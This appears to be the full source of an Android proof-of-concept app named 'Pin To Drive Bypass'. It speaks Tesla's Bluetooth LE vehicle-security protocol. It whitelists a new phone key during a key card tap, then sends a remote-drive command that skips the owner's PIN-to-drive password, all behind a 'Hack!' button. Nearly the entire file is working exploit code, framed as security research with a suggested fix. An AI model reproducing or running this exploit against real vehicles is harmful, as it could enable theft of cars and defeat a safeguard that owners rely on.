/* Pin To Drive Bypass (P2DB) by Lex Nastin
 *
 * For educational / security research
 * purposes ONLY!
 *
 * You might need to restart the app a few
 * times if it doesn't tell you to scan
 * the key card within about 10 seconds.
 * Sorry, couldn't figure out why :/.
 *
 * If you're reading, just skip down to the
 * main (onCreate) function
 *
 * Some comments in this project may require
 * you to turn off word wrap and having a
 * monospace font (mainly the comment about
 * stages)
 *
 * So, how does this program work you may
 * ask? Quite simple actually! After
 * reverse engineering the Tesla Bluetooth
 * Low Energy API, I realised that there
 * was a simple mistake made by the
 * developers, an option that they
 * possibly didn't intend to release. That
 * is, remote start. The problem is that
 * over Bluetooth, it doesn't require your
 * account password. This makes up for a
 * simple attack; you simply add your
 * phone key, and then remote start the
 * car over Bluetooth ( the owner *does*
 * get a notification that the key was
 * added though )
 */

package com.lexnastin.p2db

import android.app.AlarmManager
import android.app.PendingIntent
import android.bluetooth.*
import android.bluetooth.le.BluetoothLeScanner
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import com.google.protobuf.ByteString
import com.lexnastin.VCSEC.VCSEC
import com.lexnastin.VCSEC.VCSEC.*
import org.spongycastle.crypto.InvalidCipherTextException
import org.spongycastle.crypto.engines.AESEngine
import org.spongycastle.crypto.modes.GCMBlockCipher
import org.spongycastle.crypto.params.AEADParameters
import org.spongycastle.crypto.params.KeyParameter
import org.spongycastle.jce.ECNamedCurveTable
import org.spongycastle.jce.ECPointUtil
import org.spongycastle.jce.provider.BouncyCastleProvider
import org.spongycastle.jce.spec.ECNamedCurveParameterSpec
import org.spongycastle.jce.spec.ECNamedCurveSpec
import org.spongycastle.pqc.jcajce.spec.McElieceCCA2KeyGenParameterSpec
import java.nio.ByteBuffer
import java.security.*
import java.security.PublicKey
import java.security.spec.ECGenParameterSpec
import java.security.spec.ECPublicKeySpec
import java.security.spec.InvalidKeySpecException
import java.util.*
import javax.crypto.KeyAgreement
import kotlin.system.exitProcess


class MainActivity : AppCompatActivity() {
    // For temporarily storing a keypair
    var keyPair: KeyPair? = null
    // For temporarily storing the car's public "ephemeral" key
    private var ephemeralKey: ByteArray? = null
    // Stages are for tracking what has been done and what must be done next
    // Stage code:                   -1                          0              1                  2                      3                       4                 5
    // We got 7 stages:              none/error,                 connected,     whitelist waiting, whitelist approved,    received ephemeral key, authenticated,    remote start confirmed     <- These are the actual states
    // What we do during that stage: connect/show error to user, whitelist key, do nothing,        request ephemeral key, authenticate,           remote start car, disconnect                 <- This is what is done when we find out about those states
    var stage: Int = -1
    // For temporarily storing full length of a message when split up into chunks
    var fullLength: Int = 0
    // For temporarily storing how many parts of the split message were received
    var iteration: Int = -1
    // For storing chunk size of split up message
    var chunkSize: Int = 0
    // For piecing together a full message from a split one
    var splitMsg: ByteArray = ByteArray(0)
    // A hashmap to easily store and retrieve found devices
    val bluetoothDeviceMap: MutableMap<String, BluetoothDevice> = HashMap()

    // Requests required permissions
    private fun requestPerms() {
        val perms = ArrayList<String>()

        if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != PackageManager.PERMISSION_GRANTED) {
            perms.add("android.permission.ACCESS_FINE_LOCATION")
        }
        if (checkSelfPermission("android.permission.BLUETOOTH_SCAN") != PackageManager.PERMISSION_GRANTED) {
            perms.add("android.permission.BLUETOOTH_SCAN")
        } else {
            beginScan()
        }
        if (checkSelfPermission("android.permission.BLUETOOTH_CONNECT") != PackageManager.PERMISSION_GRANTED) {
            perms.add("android.permission.BLUETOOTH_CONNECT")
        }

        if (perms.size > 0) {
            requestPermissions(perms.toTypedArray(), ALL_PERMS)
        }
    }

    // Makes sure Bluetooth is on, if not, turns it on
    private fun confirmBluetoothOn() {
        if (!(applicationContext.getSystemService(BLUETOOTH_SERVICE) as BluetoothManager).adapter.isEnabled) {
            val enableBtIntent = Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE)
            if(checkSelfPermission("android.permission.BLUETOOTH_CONNECT") == PackageManager.PERMISSION_GRANTED) {
                startActivity(enableBtIntent)
            }
        }
    }

    // Generates a new keypair
    private fun generateKeyPair(): KeyPair? {
        try {
            val eCGenParameterSpec = ECGenParameterSpec("prime256v1")
            val instance: KeyPairGenerator = KeyPairGenerator.getInstance("EC")
            instance.initialize(eCGenParameterSpec, SecureRandom())
            return instance.generateKeyPair()
        } catch (e: NoSuchAlgorithmException) {
            e.printStackTrace()
        } catch (e: InvalidAlgorithmParameterException) {
            e.printStackTrace()
        }
        return null
    }

    // Prepends length of byte array to itself, used to send a message to the car
    private fun prependLength(message: ByteArray): ByteArray {
        val newMessage = ByteArray(message.size + 2)
        for (i in message.indices) {
            newMessage[i + 2] = message[i]
        }
        newMessage[0] = (message.size shr 8 and 255).toByte()
        newMessage[1] = (message.size and 255).toByte()
        return newMessage
    }

    // Encrypts a message using the car's ephemeral key, a nonce, and a private key
    private fun encryptMsg(
        toEncrypt: ByteArray,
        ephemeralKey: ByteArray?,
        nonce: Int,
        privateKey: PrivateKey?
    ): ByteArray? {
        try {
            val parameterSpec: ECNamedCurveParameterSpec =
                ECNamedCurveTable.getParameterSpec("prime256v1")
            val kfInstance = KeyFactory.getInstance("ECDSA", BouncyCastleProvider())
            val eCNamedCurveSpec = ECNamedCurveSpec(
                "prime256v1",
                parameterSpec.curve,
                parameterSpec.g,
                parameterSpec.n
            )
            val publicKey: PublicKey = kfInstance.generatePublic(
                ECPublicKeySpec(
                    ECPointUtil.decodePoint(
                        eCNamedCurveSpec.curve,
                        ephemeralKey
                    ), eCNamedCurveSpec
                )
            )
            val instance: KeyAgreement = KeyAgreement.getInstance("ECDH")
            instance.init(privateKey)
            instance.doPhase(publicKey, true)
            val encoded: ByteArray = instance.generateSecret("AES").encoded
            val instance2 = MessageDigest.getInstance(McElieceCCA2KeyGenParameterSpec.SHA1)
            instance2.update(encoded)
            val secretKey: ByteArray = Arrays.copyOfRange(instance2.digest(), 0, 16)
            val aEADParameters = AEADParameters(
                KeyParameter(secretKey), 128, byteArrayOf(
                    (nonce shr 24 and 255).toByte(),
                    (nonce shr 16 and 255).toByte(),
                    (nonce shr 8 and 255).toByte(),
                    (nonce and 255).toByte()
                )
            )
            val gCMBlockCipher = GCMBlockCipher(AESEngine())
            gCMBlockCipher.init(true, aEADParameters)
            val outArr = ByteArray(gCMBlockCipher.getOutputSize(toEncrypt.size))
            println(
                gCMBlockCipher.doFinal(
                    outArr,
                    gCMBlockCipher.processBytes(toEncrypt, 0, toEncrypt.size, outArr, 0)
                )
            )
            return outArr
        } catch (e: InvalidCipherTextException) {
            e.printStackTrace()
        } catch (e: NoSuchAlgorithmException) {
            e.printStackTrace()
        } catch (e: InvalidKeyException) {
            e.printStackTrace()
        } catch (e: InvalidKeySpecException) {
            e.printStackTrace()
        }
        return null
    }

    // Generates a message to whitelist a key
    private fun generateWhitelistMessage(keyPair: KeyPair?) : ByteArray {
        val uMsg = UnsignedMessage.newBuilder()
        val wlPC = PermissionChange.newBuilder()
        val wlOp = WhitelistOperation.newBuilder()
        val pubKey = VCSEC.PublicKey.newBuilder()
        val metadataForKey = KeyMetadata.newBuilder()
        val signedMessage = SignedMessage.newBuilder()
        val toVCSECMessage = ToVCSECMessage.newBuilder()

        wlPC.addPermission(WhitelistKeyPermission_E.WHITELISTKEYPERMISSION_REMOTE_DRIVE)

        pubKey.publicKeyRaw = ByteString.copyFrom(
            (keyPair?.public?.encoded!!).copyOfRange(
                26,
                keyPair.public?.encoded?.size!!
            )
        )
        metadataForKey.keyFormFactor = KeyFormFactor.KEY_FORM_FACTOR_ANDROID_DEVICE
        wlPC.key = pubKey.build()
        wlOp.addKeyToWhitelistAndAddPermissions = wlPC.build()
        wlOp.metadataForKey = metadataForKey.build()
        uMsg.whitelistOperation = wlOp.build()

        signedMessage.signatureType = SignatureType.SIGNATURE_TYPE_PRESENT_KEY
        signedMessage.protobufMessageAsBytes = ByteString.copyFrom(uMsg.build().toByteArray())
        toVCSECMessage.signedMessage = signedMessage.build()

        return prependLength(toVCSECMessage.build().toByteArray())
    }

    // Generates a message to retrieve the ephemeral key
    private fun generateEKeyMessage(keyPair: KeyPair?) : ByteArray {
        val instance = MessageDigest.getInstance(McElieceCCA2KeyGenParameterSpec.SHA1)
        instance.update((keyPair?.public?.encoded!!).copyOfRange(
            26,
            keyPair.public?.encoded?.size!!
        ))
        val keyId = Arrays.copyOfRange(instance.digest(), 0, 4)

        val toVCSECMessage = ToVCSECMessage.newBuilder()
        val uMsg = UnsignedMessage.newBuilder()
        val kId = KeyIdentifier.newBuilder()
        val iReq = InformationRequest.newBuilder()

        kId.publicKeySHA1 = ByteString.copyFrom(keyId)
        iReq.keyId = kId.build()
        iReq.informationRequestType = InformationRequestType.INFORMATION_REQUEST_TYPE_GET_EPHEMERAL_PUBLIC_KEY
        uMsg.informationRequest = iReq.build()
        toVCSECMessage.unsignedMessage = uMsg.build()

        return prependLength(toVCSECMessage.build().toByteArray())
    }

    // Generates a message to authenticate with the car
    private fun generateAuthMessage(keyPair: KeyPair?, ephemeralKey: ByteArray?) : ByteArray {
        val instance = MessageDigest.getInstance(McElieceCCA2KeyGenParameterSpec.SHA1)
        instance.update((keyPair?.public?.encoded!!).copyOfRange(
            26,
            keyPair.public?.encoded?.size!!
        ))
        val keyId = Arrays.copyOfRange(instance.digest(), 0, 4)

        val privateKey : PrivateKey = keyPair.private

        val toVCSECMessage = ToVCSECMessage.newBuilder()
        val sMsg = SignedMessage.newBuilder()
        val uMsg = UnsignedMessage.newBuilder()
        val aRes = AuthenticationResponse.newBuilder()

        aRes.authenticationLevel = AuthenticationLevel_E.AUTHENTICATION_LEVEL_NONE
        uMsg.authenticationResponse = aRes.build()

        val suMsg = encryptMsg(uMsg.build().toByteArray(), ephemeralKey, 1, privateKey)
        sMsg.protobufMessageAsBytes = ByteString.copyFrom(suMsg?.copyOfRange(0, suMsg.size - 16))
        sMsg.signature = ByteString.copyFrom(suMsg?.copyOfRange(suMsg.size - 16, suMsg.size))
        sMsg.counter = 1
        sMsg.keyId = ByteString.copyFrom(keyId)

        toVCSECMessage.signedMessage = sMsg.build()

        return prependLength(toVCSECMessage.build().toByteArray())
    }

    // Generates a message to start the car. This is where the problem lies, it doesn't require a password... I'd ask that if you do want to do something about this problem then please just make this function have a "password" field in the protobuf
    private fun generateRemoteStartMessage(keyPair: KeyPair?, ephemeralKey: ByteArray?) : ByteArray {
        val instance = MessageDigest.getInstance(McElieceCCA2KeyGenParameterSpec.SHA1)
        instance.update((keyPair?.public?.encoded!!).copyOfRange(
            26,
            keyPair.public?.encoded?.size!!
        ))
        val keyId = Arrays.copyOfRange(instance.digest(), 0, 4)

        val privateKey : PrivateKey = keyPair.private

        val toVCSECMessage = ToVCSECMessage.newBuilder()
        val sMsg = SignedMessage.newBuilder()
        val uMsg = UnsignedMessage.newBuilder()

        uMsg.rkeAction = RKEAction_E.RKE_ACTION_REMOTE_DRIVE

        val suMsg = encryptMsg(uMsg.build().toByteArray(), ephemeralKey, 2, privateKey)
        sMsg.protobufMessageAsBytes = ByteString.copyFrom(suMsg?.copyOfRange(0, suMsg.size - 16))
        sMsg.signature = ByteString.copyFrom(suMsg?.copyOfRange(suMsg.size - 16, suMsg.size))
        sMsg.counter = 2
        sMsg.keyId = ByteString.copyFrom(keyId)
        toVCSECMessage.signedMessage = sMsg.build()

        return prependLength(toVCSECMessage.build().toByteArray())
    }

    // Check which stage we are in and do actions accordingly; for every stage that sends something to the car we add a half a second delay to avoid stability issues in this PoC
    private fun doStage(gatt: BluetoothGatt?, writeChar: BluetoothGattCharacteristic?) {
        runOnUiThread {
            if (checkSelfPermission("android.permission.BLUETOOTH_CONNECT") == PackageManager.PERMISSION_GRANTED) {
                when (stage) {
                    -1 -> {
                        addText(R.string.error)
                        gatt?.disconnect()
                        gatt?.close()
                        keyPair = null
                    }
                    0 -> {
                        Handler(Looper.getMainLooper()).postDelayed({
                            writeChar?.value = generateWhitelistMessage(keyPair)
                            gatt?.writeCharacteristic(writeChar)
                        }, 500)
                    }
                    1 -> {
                        addText(R.string.keycard)
                    }
                    2 -> {
                        Handler(Looper.getMainLooper()).postDelayed({
                            addText(R.string.thanks)
                            writeChar?.value = generateEKeyMessage(keyPair)
                            gatt?.writeCharacteristic(writeChar)
                        }, 500)
                    }
                    3 -> {
                        Handler(Looper.getMainLooper()).postDelayed({
                            writeChar?.value = generateAuthMessage(keyPair, ephemeralKey)
                            gatt?.writeCharacteristic(writeChar)
                        }, 500)
                    }
                    4 -> {
                        Handler(Looper.getMainLooper()).postDelayed({
                            writeChar?.value = generateRemoteStartMessage(keyPair, ephemeralKey)
                            gatt?.writeCharacteristic(writeChar)
                        }, 500)
                    }
                    5 -> {
                        gatt?.disconnect()
                        stage = -1
                        keyPair = null
                    }
                }
            }
        }
    }

    // Function to show the user a message
    private fun addText(text: Int) {
        val list : LinearLayout = findViewById(R.id.messageList)

        val newText = TextView(this)
        newText.layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT)
        newText.setText(text)
        val space = Space(this)
        space.layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 24)

        list.addView(newText, 0)
        list.addView(space, 1)
    }

    // Function that begins scanning for vehicles
    private fun beginScan() {
        // Bluetooth manager to create a bluetooth adapter object
        val bluetoothManager : BluetoothManager = applicationContext.getSystemService(
            BLUETOOTH_SERVICE
        ) as BluetoothManager
        // Bluetooth adapter to create a scanner object
        val bluetoothAdapter : BluetoothAdapter = bluetoothManager.adapter
        // Bluetooth scanner to connect to and send/receive messages to/from the car
        val bluetoothLeScanner : BluetoothLeScanner = bluetoothAdapter.bluetoothLeScanner
        // Used to display selectable devices in UI
        val deviceAdapter = ArrayAdapter<String>(this, R.layout.support_simple_spinner_dropdown_item)
        findViewById<Spinner>(R.id.spinner).adapter = deviceAdapter
        // Callback for devices found
        val scanCallback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult?) {
                super.onScanResult(callbackType, result)

                // Check if car name matches pattern
                if (checkSelfPermission("android.permission.BLUETOOTH_CONNECT") == PackageManager.PERMISSION_GRANTED &&
                    result != null && result.device.name != null && deviceAdapter.getPosition(
                        result.device.name.toString() + " - " + result.device
                            .address
                    ) == -1  && result.device.name.matches(Regex("^S[a-f\\d]{16}[A-F]$"))) {
                    // If name matches and isn't already in the UI dropdown, add device to hashmap and dropdown
                    bluetoothDeviceMap[result.device.name.toString() + " - " + result.device.address] = result.device
                    deviceAdapter.add(
                        result.device.name.toString() + " - " + result.device
                            .address
                    )
                }
            }
        }

        // Start scanning for Teslas
        if (checkSelfPermission("android.permission.BLUETOOTH_SCAN") == PackageManager.PERMISSION_GRANTED) {
            bluetoothLeScanner.startScan(scanCallback)
        }
    }

    // Makes sure that the permissions were granted to the required permissions
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String?>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        var anyDeclined = false

        repeat(permissions.size) { i ->
            if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                anyDeclined = true
            } else if (permissions[i] == "android.permission.BLUETOOTH_SCAN") {
                beginScan()
            }
        }

        if (anyDeclined) {
            Toast.makeText(applicationContext, R.string.no_perms, Toast.LENGTH_LONG).show()
        }
    }

    // Main function
    override fun onCreate(savedInstanceState: Bundle?) {
        // Default Android stuff
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Request permissions
        requestPerms()
        confirmBluetoothOn()

        // Used to get certain crypto functions
        Security.insertProviderAt(BouncyCastleProvider(), 1)

        // Make the restart app button restart the app
        findViewById<Button>(R.id.restart).setOnClickListener {
            Toast.makeText(applicationContext, R.string.restarting, Toast.LENGTH_SHORT).show()
            val mStartActivity = Intent(applicationContext, MainActivity::class.java)
            val mPendingIntent = PendingIntent.getActivity(
                applicationContext,
                -1,
                mStartActivity,
                PendingIntent.FLAG_CANCEL_CURRENT + PendingIntent.FLAG_IMMUTABLE
            )
            val mgr : AlarmManager? = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
            mgr?.setExact(AlarmManager.RTC, System.currentTimeMillis() + 500, mPendingIntent)
        }

        // Bluetooth manager to create a bluetooth adapter object
        val bluetoothManager : BluetoothManager = applicationContext.getSystemService(
            BLUETOOTH_SERVICE
        ) as BluetoothManager
        // Bluetooth adapter to create a scanner object
        val bluetoothAdapter : BluetoothAdapter = bluetoothManager.adapter
        // Bluetooth scanner to connect to and send/receive messages to/from the car
        val bluetoothLeScanner : BluetoothLeScanner = bluetoothAdapter.bluetoothLeScanner

        // When the "Hack!" button is pressed
        findViewById<Button>(R.id.button).setOnClickListener {
            // Make sure at least one car is found
            if (findViewById<Spinner>(R.id.spinner).childCount == 0) {
                addText(R.string.select_device)
                return@setOnClickListener
            }

            // Make sure we're not in the middle of something
            if (stage >= 0) {
                addText(R.string.wait)
                return@setOnClickListener
            }

            stage = 0

            // Connect to car selected in the dropdown and add a callback function to it
            if (checkSelfPermission("android.permission.BLUETOOTH_SCAN") == PackageManager.PERMISSION_GRANTED) {
                bluetoothDeviceMap[findViewById<Spinner>(R.id.spinner).selectedItem.toString()]
                    ?.connectGatt(applicationContext, false, object : BluetoothGattCallback() {
                        // Create a variable to store the write characteristic
                        var writeChar: BluetoothGattCharacteristic? = null

                        override fun onConnectionStateChange(
                            gatt: BluetoothGatt,
                            status: Int,
                            newState: Int
                        ) {
                            when (newState) {
                                // If connected to car
                                BluetoothProfile.STATE_CONNECTED -> {
                                    // Begin service discovery
                                    if (checkSelfPermission("android.permission.BLUETOOTH_CONNECT") == PackageManager.PERMISSION_GRANTED) {
                                        gatt.discoverServices()
                                        bluetoothLeScanner.stopScan(object : ScanCallback() {})
                                    }
                                }
                                BluetoothProfile.STATE_DISCONNECTED -> {
                                    bluetoothLeScanner.stopScan(object : ScanCallback() {})
                                    gatt.close()
                                }
                            }
                        }

                        override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                            // Set up all the services and characteristics
                            super.onServicesDiscovered(gatt, status)
                            val serviceUUID =
                                UUID.fromString("00000211-b2d1-43f0-9b88-960cebf8b91e")
                            val writeUUID = UUID.fromString("00000212-b2d1-43f0-9b88-960cebf8b91e")
                            val readUUID = UUID.fromString("00000213-b2d1-43f0-9b88-960cebf8b91e")
                            val serviceService = gatt.getService(serviceUUID)
                            // Set the global write characteristic to the right thing for later use
                            writeChar = serviceService.getCharacteristic(writeUUID)
                            // Enable indications for receiving messages from the car
                            val readChar = serviceService.getCharacteristic(readUUID)
                            val readNotificationDescriptor =
                                readChar.getDescriptor(UUID.fromString("00002902-0000-1000-8000-00805f9b34fb"))
                            readNotificationDescriptor.value =
                                BluetoothGattDescriptor.ENABLE_INDICATION_VALUE
                            if (checkSelfPermission("android.permission.BLUETOOTH_CONNECT") == PackageManager.PERMISSION_GRANTED) {
                                gatt.writeDescriptor(readNotificationDescriptor)
                                gatt.setCharacteristicNotification(readChar, true)
                            }

                            // Generate a temporary key pair for signing messages to the car
                            keyPair = generateKeyPair()

                            // Do first stage
                            doStage(gatt, writeChar)
                        }

                        // On read
                        override fun onCharacteristicChanged(
                            gatt: BluetoothGatt,
                            characteristic: BluetoothGattCharacteristic
                        ) {
                            super.onCharacteristicChanged(gatt, characteristic)
                            // Get expected length and protobuf message in bytes from the message
                            val length = ByteBuffer.wrap(
                                Arrays.copyOfRange(
                                    characteristic.value,
                                    0,
                                    2
                                )
                            ).short
                            val valueBytes = Arrays.copyOfRange(
                                characteristic.value,
                                2,
                                characteristic.value.size
                            )

                            // Check if received length is the same as the actual length of data
                            if (length.compareTo(valueBytes.size) == 0) {
                                // If so, create a decoded version of the message
                                val value = FromVCSECMessage.parseFrom(valueBytes)
                                // Check for current stage and then do that stage
                                when {
                                    value?.commandStatus?.operationStatus == OperationStatus_E.OPERATIONSTATUS_WAIT -> {
                                        stage = 1
                                        doStage(gatt, writeChar)
                                    }
                                    value?.commandStatus?.whitelistOperationStatus?.hasSignerOfOperation()!! -> {
                                        stage = 2
                                        doStage(gatt, writeChar)
                                    }
                                    !value.sessionInfo?.publicKey?.isEmpty!! -> {
                                        ephemeralKey = value.sessionInfo?.publicKey!!.toByteArray()
                                        stage = 3
                                        doStage(gatt, writeChar)
                                    }
                                    value.commandStatus?.signedMessageStatus?.counter == 1 -> {
                                        stage = 4
                                        doStage(gatt, writeChar)
                                    }
                                    value.commandStatus?.signedMessageStatus?.counter == 2 -> {
                                        stage = 5
                                        doStage(gatt, writeChar)
                                    }
                                }
                            } else {
                                // If not, begin piecing together the message:
                                // Set iteration to 0
                                iteration++
                                // If full length isn't initialised, set it to expected length
                                if (fullLength == 0) fullLength = length.toInt()
                                // If the split message isn't initialised, set it to an empty message of the expected length
                                if (splitMsg.isEmpty()) splitMsg = ByteArray(length.toInt())
                                // Set perceived chunk size of message
                                if (chunkSize == 0) chunkSize = characteristic.value.size
                                // If at first iteration, append only the data bytes into the split message variable
                                if (iteration == 0) {
                                    valueBytes.copyInto(splitMsg)
                                } else {
                                    // Otherwise append all the bytes received to the split message variable
                                    characteristic.value.copyInto(
                                        splitMsg,
                                        iteration * chunkSize - 2
                                    )
                                }
                                // If we seem to have received the rest of the message check for which stage we're meant to be in, and execute it
                                if (iteration * chunkSize + 18 >= fullLength) {
                                    val value = FromVCSECMessage.parseFrom(splitMsg)
                                    when {
                                        value?.commandStatus?.operationStatus == OperationStatus_E.OPERATIONSTATUS_ERROR -> {
                                            stage = -1
                                            doStage(gatt, writeChar)
                                        }
                                        value?.commandStatus?.operationStatus == OperationStatus_E.OPERATIONSTATUS_WAIT -> {
                                            stage = 1
                                            doStage(gatt, writeChar)
                                        }
                                        value?.commandStatus?.whitelistOperationStatus?.hasSignerOfOperation()!! -> {
                                            stage = 2
                                            doStage(gatt, writeChar)
                                        }
                                        !value.sessionInfo?.publicKey?.isEmpty!! -> {
                                            ephemeralKey =
                                                value.sessionInfo?.publicKey!!.toByteArray()
                                            stage = 3
                                            doStage(gatt, writeChar)
                                        }
                                        value.commandStatus?.signedMessageStatus?.counter == 1 -> {
                                            stage = 4
                                            doStage(gatt, writeChar)
                                        }
                                        value.commandStatus?.signedMessageStatus?.counter == 2 -> {
                                            stage = 5
                                            doStage(gatt, writeChar)
                                        }
                                    }
                                    // Reset all the variables for joining split messages when we're done for repeat use
                                    fullLength = 0
                                    splitMsg = ByteArray(0)
                                    iteration = -1
                                }
                            }
                        }
                    })
            }
        }
    }

    // For permissions
    companion object {
        const val ALL_PERMS = 0
    }
}